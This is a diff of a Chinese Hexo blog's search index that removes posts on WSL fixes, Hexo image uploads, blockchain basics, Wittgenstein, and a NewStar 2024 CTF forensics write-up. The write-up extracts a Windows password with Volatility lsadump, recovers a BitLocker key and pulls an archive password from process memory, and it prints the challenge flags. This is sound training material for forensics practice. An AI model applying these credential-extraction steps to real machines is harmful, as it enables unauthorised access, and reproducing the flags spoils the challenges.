-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>
-
-<p>然后重启电脑，看wsl还能运行吗</p>
-<p>我是运行了这个就好了，界面：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-更新-WSL-核心"><a href="#2-更新-WSL-核心" class="headerlink" title="2.更新 WSL 核心"></a>2.更新 WSL 核心</h2><p>WSL 需要最新版本的核心来支持虚拟机实例。更新核心：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure>
-
-<p>运行后检查版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --version</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-检查虚拟化支持"><a href="#3-检查虚拟化支持" class="headerlink" title="3.检查虚拟化支持"></a>3.<strong>检查虚拟化支持</strong></h2><p>确保启用了虚拟化支持</p>
-<h2 id="4-重置或重装-WSL"><a href="#4-重置或重装-WSL" class="headerlink" title="4.重置或重装 WSL"></a>4.<strong>重置或重装 WSL</strong></h2><p>实在不行重置 WSL：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --unregister &lt;你的发行版名称&gt;</span><br></pre></td></tr></table></figure>
-
-<p>或者重装 WSL：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="5-检查-Windows-服务"><a href="#5-检查-Windows-服务" class="headerlink" title="5.检查 Windows 服务"></a>5.检查 Windows 服务</h2><p>错误代码中提到 <strong>HCS_E_SERVICE_NOT_AVAILABLE</strong> 可能表明相关服务未运行：</p>
-<p>按 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win + R</span><br></pre></td></tr></table></figure>
-
-<p> 键，输入 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure>
-
-<p>，检查以下服务是否已启动：</p>
-<p><strong>Hyper-V Host Compute Service</strong></p>
-<p><strong>Virtual Machine Management</strong></p>
-<p>如果未启动，右键启动这些服务。</p>
-]]></content>
-      <tags>
-        <tag>wsl</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blog 为何上传不了图像的解决</title>
-    <url>/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
-    <content><![CDATA[<h1 id="前两天我一直困在为何博客上传不了图像"><a href="#前两天我一直困在为何博客上传不了图像" class="headerlink" title="前两天我一直困在为何博客上传不了图像"></a>前两天我一直困在为何博客上传不了图像</h1><h2 id="而现在我似乎找到了解决方法"><a href="#而现在我似乎找到了解决方法" class="headerlink" title="而现在我似乎找到了解决方法"></a>而现在我似乎找到了解决方法</h2><p>首先你要先下了hexo-asset-image</p>
-<p>而且在config.yml里有个post_asset_folder:要为true</p>
-<p>要做到创建新博客时候能在同目录下自动创建同名文件夹，img就可以放在这个文件夹里面</p>
-<p>然后再typora里设置要选择优先<strong>相对路径</strong>（这个很重要</p>
-<p>保证相对路径的时候再插入图片</p>
-<p>插入图片后查看github对应的文件夹下面有没有相应的图片</p>
-<p><em><strong>因为本质上插入的图片引用的是github的路径，如果github对应目录上没有该图片的话自然在博客上显示不出来</strong></em></p>
-<p>然后再</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-<p>三连试试，每试完一遍可以直接去github上看看，<strong>如果没有这个图片的话试试这个</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>
-
-<p>就这四个来回试，直到对应的github文件夹下出现对应图片就可以上传成功了</p>
-<p><img src="11.png" alt="11"></p>
-<p>类似于这样，要在github目录下能看到，<del>而且似乎图片的命名要简单（？</del></p>
-<p>如果还传不上去的话可以缩放图片试试</p>
-<p><del>（猜想：说不定可以直接在github上add file，下次试试）</del></p>
-<p><del>ps：（这是不是图片加载慢的原因？）</del></p>
-]]></content>
-      <tags>
-        <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>newstar2024小明同学们复现</title>
-    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。</p>
-<h1 id="1-热心助人的小明同学"><a href="#1-热心助人的小明同学" class="headerlink" title="1.热心助人的小明同学"></a><u>1.热心助人的小明同学</u></h1><p>这个很简单，只要装好vol2，然后lsadump看密码就好</p>
-<p>先看操作版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></table></figure>
-
-<img src="屏幕截图 2024-12-20 140254.png" alt="屏幕截图 2024-12-20 140254" style="zoom:67%;">
-
-<p>看到操作版本是 Win7SP1x86_23418</p>
-<p>然后直接lsadump就好</p>
-<img src="屏幕截图 2024-12-20 140511.png" alt="屏幕截图 2024-12-20 140511" style="zoom:75%;">
-
-<p>密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）</p>
-<p>所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}</p>
-<h1 id="2-擅长音游的小明同学"><a href="#2-擅长音游的小明同学" class="headerlink" title="2.擅长音游的小明同学"></a><u>2.擅长音游的小明同学</u></h1><p>拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的</p>
-<p>在win7那个下面的<code>root/users/desktop</code>可以看到</p>
-<img src="屏幕截图 2025-01-04 210938.png" alt="屏幕截图 2025-01-04 210938" style="zoom:75%;">
-
-<blockquote>
-<p>[!NOTE]</p>
-<p>真相.txt</p>
-<p>真相会不经意间流入日常的点点滴滴……<br>真相在哪里?</p>
-</blockquote>
-<blockquote>
-<p>[!NOTE]</p>
-<p>要开始了呦.txt</p>
-<p>今天舞萌彩框了好开心啊o(<em>￣▽￣</em>)ブ<br>我要把这一刻用照片保存下来<br>不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了<br>打开也没发现什么异常，但是体积好像变大了一点<br>是错觉吗？</p>
-</blockquote>
-<p>可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg</p>
-<img src="屏幕截图 2025-01-04 211404.png" alt="屏幕截图 2025-01-04 211404" style="zoom:75%;">
-
-<p>没啥思路了binwalk一下（感觉挺正常的</p>
-<p>发现一个txt内容是：</p>
-<p>听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#</p>
-<p>然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载</p>
-<img src="屏幕截图 2025-01-05 132008.png" alt="屏幕截图 2025-01-05 132008" style="zoom:75%;">
-
-<p>使用VM挂载一下，注意要用管理员运行。</p>
-<p>这里要选择UEFI</p>
-<img src="屏幕截图 2025-01-05 132348.png" alt="屏幕截图 2025-01-05 132348" style="zoom:75%;">
-
-<p>挂载出问题了。。。</p>
-<h1 id="3-擅长加密的小明同学"><a href="#3-擅长加密的小明同学" class="headerlink" title="3.擅长加密的小明同学"></a><u>3.擅长加密的小明同学</u></h1><p>拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件</p>
-<p>vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor</p>
-<p>选择<code>decrypt or mount disk / image file of disk\partition</code></p>
-<img src="屏幕截图 2025-01-05 144711.png" alt="屏幕截图 2025-01-05 144711" style="zoom:50%;">
-
-<p>进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422</p>
-<p>输入恢复密钥之后得到了一个flag.7z，解压需要密码。</p>
-<p>7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。</p>
-<p>查看操作版本</p>
-<img src="屏幕截图 2025-01-28 161649.png" alt="屏幕截图 2025-01-28 161649" style="zoom:80%;">
-
-<p>查看有什么进程</p>
-<img src="屏幕截图 2025-01-28 161823.png" alt="屏幕截图 2025-01-28 161823" style="zoom:80%;">
-
-<p>看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：</p>
-<img src="屏幕截图 2025-01-28 162129.png" alt="屏幕截图 2025-01-28 162129" style="zoom:80%;">
-
-<p>然后改后缀为data，拉入GIMP.</p>
-<p>图像类型选择RGB透明，拉X,Y,Z，最后得到：</p>
-<img src="屏幕截图 2025-01-28 162730.png" alt="屏幕截图 2025-01-28 162730" style="zoom:80%;">
-
-<p>压缩包密码：<code>rxnifbeiyomezpplugho</code></p>
-<p>解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-        <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>区块链Blockchain学习</title>
-    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>怎么现在的misc区块链内容越来越多了，不得不学了</p>
-<h1 id="什么是区块链？"><a href="#什么是区块链？" class="headerlink" title="什么是区块链？"></a>什么是区块链？</h1><p><strong>区块链</strong>（英语：blockchain或block chain）是借由<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>与<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E8%AD%98%E6%A9%9F%E5%88%B6">共识机制</a>等技术建立与存储庞大交易资料链的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%AD%89%E7%B6%B2%E8%B7%AF">点对点</a>网络系统。</p>
-<p><strong>从字面上看：</strong>区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。</p>
-<p><strong>从计算机上看：</strong>区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。</p>
-<p>区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。</p>
-<p><strong>有没一两句话能说明白区块链的？</strong></p>
-<p>有的。</p>
-<p>麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。</p>
-<h1 id="基本名词-工具使用"><a href="#基本名词-工具使用" class="headerlink" title="基本名词&amp;&amp;工具使用"></a>基本名词&amp;&amp;工具使用</h1><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><p>顾名思义就是存储钱的钱包</p>
-<p>这里推荐使用MetaMask，chrome浏览器上的一个插件。</p>
-<img src="屏幕截图 2025-02-09 182036.png" alt="屏幕截图 2025-02-09 182036" style="zoom:80%;">
-
-<p>应该也可以使用 imtoken ，手机上的钱包</p>
-<p>注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些<strong>助记词</strong>，用来在忘记密码（私钥）的时候找回密码或钱包。</p>
-<p><strong>切换网络</strong></p>
-<p>在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络</p>
-<img src="屏幕截图 2025-02-09 182359.png" alt="屏幕截图 2025-02-09 182359" style="zoom: 50%;">
-
-<p>这个主要看比赛的网路。</p>
-<h3 id="如何获取以太币？"><a href="#如何获取以太币？" class="headerlink" title="如何获取以太币？"></a>如何获取以太币？</h3><p>主要有一些水龙头可以每日拿一点，网上可以搜到</p>
-<p>1.<a href="https://zan.top/faucet">ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens</a></p>
-<p>2.<a href="https://www.alchemy.com/faucets/ethereum-sepolia">Ethereum Sepolia Faucet</a></p>
-<h3 id="助记词"><a href="#助记词" class="headerlink" title="助记词"></a>助记词</h3><p>助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。</p>
-<p>但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个</p>
-<p>这里是所有2048个助记词（英文）： <a href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips</a></p>
-<p>如果从题目中拿到的一些助记词可以从这里缩小范围。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Blockchain</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Blockchain</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于ZIP伪加密</title>
     <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
     <content><![CDATA[<p>ZIP伪加密看似简单，实则也是大有学问在里面</p>
@@ -2612,68 +2745,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>哲学-维特根斯坦</title>
-    <url>/2024/11/%E5%93%B2%E5%AD%A6-%E7%BB%B4%E7%89%B9%E6%A0%B9%E6%96%AF%E5%9D%A6/</url>
-    <content><![CDATA[<h1 id="维特根斯坦：天才与之责任"><a href="#维特根斯坦：天才与之责任" class="headerlink" title="维特根斯坦：天才与之责任"></a>维特根斯坦：天才与之责任</h1><h2 id="0-写在前面"><a href="#0-写在前面" class="headerlink" title="0.写在前面"></a>0.写在前面</h2><p>这个本来是我高中时候做过的关于维特根斯坦的ppt，突然发现就想着把它发到博客上，于是乎就如此了。</p>
-<p>文章的大部分内容摘自《打开：周濂的一百堂西方哲学课》（这个是真好看，又通俗易懂）</p>
-<p>。</p>
-<h2 id="1-生平"><a href="#1-生平" class="headerlink" title="1.生平"></a>1.生平</h2><p><strong>路德维希·维特根斯坦</strong></p>
-<p>二十世纪<u>最伟大</u>的哲学家（没有之一）</p>
-<p>路德维希·维特根斯坦（Ludwig Wittgenstein）是20世纪最重要的哲学家之一，被公认为分析哲学的重要代表。他于1889年出生于奥地利，后来移居英国。维特根斯坦的思想主要围绕着语言、逻辑和意义展开，他的两部重要著作是《逻辑哲学论》和《哲学探讨》。</p>
-<p>在《逻辑哲学论》中，他试图通过逻辑分析语言，揭示哲学问题的本质，并提出了“言语游戏”的概念，强调语言的使用与特定社会活动和上下文相关。</p>
-<p>而在《哲学探讨》中，他的思想有所转变，开始强调语言的多样性和复杂性，强调语言的使用是基于社会实践和交流的。</p>
-<p>维特根斯坦的思想对逻辑学、语言哲学、认知科学等领域都产生了深远影响，他被认为是20世纪哲学最重要的思想家之一，其作品至今仍受到广泛研究和讨论。</p>
-<img src="2.jpg" alt="2" style="zoom:50%;">
-
-
-
-<h2 id="2-早期维特根斯坦——《逻辑哲学论》"><a href="#2-早期维特根斯坦——《逻辑哲学论》" class="headerlink" title="2.早期维特根斯坦——《逻辑哲学论》"></a>2.早期维特根斯坦——《逻辑哲学论》</h2><p><strong>全书共分七个章节，章节之间或并列或递进。</strong></p>
-<p><strong>全书的主旨要义在于将能<u>“说”</u>的都说清楚</strong></p>
-<h3 id="图像理论：-语言与世界具有相同的逻辑形式"><a href="#图像理论：-语言与世界具有相同的逻辑形式" class="headerlink" title="图像理论： 语言与世界具有相同的逻辑形式"></a>图像理论： 语言与世界具有相同的逻辑形式</h3><p>接下来我们介绍一下著名的“图像理论”， 这是理解《逻辑哲学论》的关键所在。“一战”期间， 维特根斯坦偶然读到一篇文章，报道了巴黎交通法院的判案过程， 在裁决汽车事故时， 法官经常用玩具模型来模拟现场发生的一切。读到这里，维特根斯坦灵光一现，意识到模型发挥的作用与命题是一样的， 都是在刻画和表现现实世界里的事实。也就是说， 语言和世界存在着对应关系。打个比方，当我们说“一辆轿车在左转时与迎面而来的卡车相撞”， 这句话与现场发生的车祸具备逻辑上的同构性，用维特根斯坦的原话说就是：“语言与世界具有通过图像映示关系相联系的平行结构。”</p>
-<p>在“4.014”节中， 维特根斯坦说：“唱片、音乐主题、乐谱和音波之间的关系正同语言与世界之间的内在描绘关系一样。它们都是按照一个共同的逻辑图样构造出来的。”</p>
-<h3 id="逻辑同构性"><a href="#逻辑同构性" class="headerlink" title="逻辑同构性"></a>逻辑同构性</h3><p>维特根斯坦认为，语言与世界之间同样存在着逻辑同构性——复合语句对应着复合事态， 原子语句对应着原子事实， 名称对应着简单对象。而复合语句、原子语句与名称彼此之间则是一个充分分析直到最终无法分析的关系。同样， 复合事态、原子事实和简单对象之间也是这样的关系。</p>
-<p><img src="3.png" alt="3"></p>
-<h3 id="说到这里，-我们可以再做一个小结："><a href="#说到这里，-我们可以再做一个小结：" class="headerlink" title="说到这里， 我们可以再做一个小结："></a>说到这里， 我们可以再做一个小结：</h3><p>首先， 乍看上去， 维特根斯坦是在主张某种符合论的观点，也就是语言反映事实， 就像镜子反映世界。但实际上他的观点要比符合论更神秘， 他认为语言和事实具有某种逻辑的同构性， 用维特根斯坦的话说就是具有相同的“逻辑形式”。</p>
-<p>其次， 维特根斯坦在这里体现出一种充分分析的态度。我刚才说了， 任何复合的语句都可以充分分析成最小单位也即名称，同样，任何复合的事态都可以充分分析成最小单位也即简单对象。</p>
-<h3 id="无法说出的逻辑形式"><a href="#无法说出的逻辑形式" class="headerlink" title="无法说出的逻辑形式"></a>无法说出的逻辑形式</h3><p>那么究竟什么叫作逻辑形式? 这又是一个非常难以理解的概念， 虽然就乐谱和琴声的例子而言， 我们可以体会到二者之间存在着某种共同的逻辑形式， 但是这种逻辑形式到底是什么， 似乎依旧无法给出进一步的说明。事实上， 维特根斯坦就是这样认为的，在他看来， 逻辑形式只能显现， 无法说出</p>
-<h3 id="《逻辑哲学论》中不可说的神秘之物"><a href="#《逻辑哲学论》中不可说的神秘之物" class="headerlink" title="《逻辑哲学论》中不可说的神秘之物"></a>《逻辑哲学论》中不可说的神秘之物</h3><p> 在《逻辑哲学论》这本书中，存在着很多只能显现但不能说出的神秘之物。借助陈嘉映的总结，这些不可说的东西包括： 逻辑形式，哲学问题， 伦理学、美学等学科， 以及包括以上三类在内的所有神秘的东西。</p>
-<p> 为什么这些东西是不可说的? 不可说的东西就是不重要的吗?对此最简单的回答就是， 它们之所以不可说， 是因为它们不是实证科学， 它们谈论的是事实之外的东西。但是这绝不意味着不可说的东西是不重要的， 恰恰相反， 维特根斯坦曾经说过， 那些在《逻辑哲学论》中没有正面处理的内容， 比方说美、生活的意义、死亡，等等， 恰恰是最重要的。</p>
-<p> 为什么不可说的是最重要的? 引用战时笔记中的一句话：“伦理学不处理世界。正如逻辑一样， 伦理学必定是世界的一个条件。”所谓条件的意思是， 如果没有它， 世界将不成其为世界， 你说它重要不重要?</p>
-<h3 id="”梯子“"><a href="#”梯子“" class="headerlink" title="”梯子“"></a>”梯子“</h3><p>在这个意义上我们甚至可以说，《逻辑哲学论》并非一本关于逻辑的著作，而是一本关于罪及与之相关的伦理、美、生活的意义的著作。虽然维特根斯坦谈论最多的是逻辑， 但逻辑只是梯子， 真正重要的东西在楼上，一旦登上了楼， 就可以撤掉梯子了。</p>
-<p>在“6.52”这一节中， 维特根斯坦说：“我们觉得， 即使一切可能的科学问题都已得到解答， 人生问题也还完全未被触及。”</p>
-<h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><p>全书第七章只有一句话：</p>
-<p><strong>“<u>对于不可说的东西我们必须保持沉默。</u>”</strong></p>
-<p>————————————————————————————————————————</p>
-<h2 id="3-后期维特根斯坦——《哲学研究》"><a href="#3-后期维特根斯坦——《哲学研究》" class="headerlink" title="3.后期维特根斯坦——《哲学研究》"></a>3.后期维特根斯坦——《哲学研究》</h2><p>维特根斯坦反维特根斯坦：</p>
-<p>•《哲学研究》</p>
-<h3 id="反本质主义："><a href="#反本质主义：" class="headerlink" title="反本质主义："></a>反本质主义：</h3><p>不要追求走出<u>柏拉图的洞穴</u>，哲学不用追求本质，追求本质是一种“<strong>哲学病</strong>”！</p>
-<p>打个比方，当有人问我们“什么是金星”的时候， 我们会非常自信地把手指向天际， 告诉他们：“喏， 就是那颗最亮的星星。”可是当有人问“什么是时间”的时候， 我们试图去寻找像金星一样的时间实体， 却发现自己茫然失措， 找不着北。</p>
-<p>为什么会出现这样的困惑? 因为我们被这两个表达式表面上的一致性给迷惑了， 以为“什么是金星”和“什么是时间”问的是同一类型的问题， 所以我们也就很自然地像寻找金星那样去寻找作为实体的时间。其实， 表面上一致的问题并不一定是同一类型的问题。</p>
-<p> 类似的诱惑无处不在， 不管是哲学家还是普通人都难以幸免。仍旧举上一讲的例子， 当说到工具二字的时候， 我们会情不自禁地想在各种工具之间寻找“共同之处”，与此类似的是， 当我们把语言看成是各种不同类型的语言游戏时， 又会忍不住去想：什么是游戏之为游戏的“共同之处”? 我们似乎总是倾向于要去总结一些什么，仿佛这么做才显得很哲学。</p>
-<p>也就是说，我们不应该对一些概念下定义，自以为得到了本质。</p>
-<h3 id="哲学冲动："><a href="#哲学冲动：" class="headerlink" title="哲学冲动："></a>哲学冲动：</h3><p>设想有人说:“所有的工具都是用来改变某种东西的，例如，锤子改变钉子的位置，锯子改变板子的形状，等等。”–尺子改变的是什么?胶水瓶和钉子改变的是什么?“改变我们对某样东西的了解，改变胶的温度和箱子的稳固程度。”–表达式是弄得一致了，但我们得到了什么呢?</p>
-<p>那些有着哲学冲动的人就试图用“改变”这个概念来定义工具的本质，可是这只是一种幻觉，它的确把表达式弄得一致了，因为所有的工具好像在改变什么，但是维特根斯坦反问，这真的有助于加深我们对工具的理解吗?</p>
-<p>维特根斯坦说，我们要放弃一种幻觉，以为我们可以抓住语言的无可与之相比的本质，“其实，只要‘语言’、‘经验’、‘世界’这些词有用处，它们的用处一定像‘桌子’、‘灯’、‘门’这些词一样卑微”。</p>
-<h3 id="”完全的黑暗“"><a href="#”完全的黑暗“" class="headerlink" title="”完全的黑暗“"></a>”完全的黑暗“</h3><p>奥古斯丁有句名言:“那么，什么是时间呢?如果没有谁问我，我倒还知道它是什么;可是，当我被问及它是什么，并试着解释时，我却糊涂了。”对此，维特根斯坦评论说:“没有谁问我们的时候我们还知道，可是要给它们一个解释时又不知道的东西，正是我们需要提醒自己注意的东西。”因为这些东西诱使我们以科学的方式提出问题并回答问题，“什么是时间”这个问题与“什么是金星”，或者“氢的比重是多少”只具有表面的相似性，如果我们看不到它们的<strong>差异性</strong>，我们就会被带入“<strong>完全的黑暗</strong>”之中。</p>
-<h3 id="“家族相似性”"><a href="#“家族相似性”" class="headerlink" title="“家族相似性”"></a>“家族相似性”</h3><p>在《哲学研究》第66节中，维特根斯坦问道:“棋类游戏，牌类游戏，球类游戏，角力游戏，它们的共同之处是什么?”然后，他立刻自我反驳道:“一不要说:它们一定有某种共同之处，否则它们不会都叫做游戏。’”</p>
-<p>维特根斯坦给出的建议是“不要想，而要看”，看到它们之间的“相似之处”和“亲缘关系”，而不是想象中的“共同之处”。</p>
-<p>那么游戏之间到底是什么关系呢？维特根斯坦说:“我想不出比‘家族相似’更好的说法。</p>
-<p>讨论到这里,我们可以说,各种“游戏”构成了一个家族,各种“工具”构成了另一个家族，我们之所以把这类活动称为游戏，把那类对象称为工具，不是因为在它们的背后存在着所谓的本质(想想亚里士多德)，也不是因为我们可以对它们进行普遍定义(想想苏格拉底)，而是因为它们之间存在着“家族相似性”。</p>
-<h3 id="让一切如其所是："><a href="#让一切如其所是：" class="headerlink" title="让一切如其所是："></a>让一切如其所是：</h3><p>蒙克说“人们常常引用维特根斯坦谈哲学的话——哲学‘让一切如其所是’。但人们常常看不到，在力求什么也不改变，只改变我们看待事物的方式时，维特根斯坦试图改变一切。”</p>
-<p><strong>就这样，维特根斯坦做到了什么也没有改变，可一切又都改变了。</strong></p>
-<p>————————————————————————————————————————</p>
-<p>1951年4月28日，维特根斯坦去世，留给这个世界的最后一句话是：</p>
-<p><em>“告诉他们我度过了极好的一生”</em></p>
-]]></content>
-      <categories>
-        <category>philosophy</category>
-      </categories>
-      <tags>
-        <tag>philosophy</tag>
-        <tag>Wittgenstein</tag>
       </tags>
   </entry>
 </search>
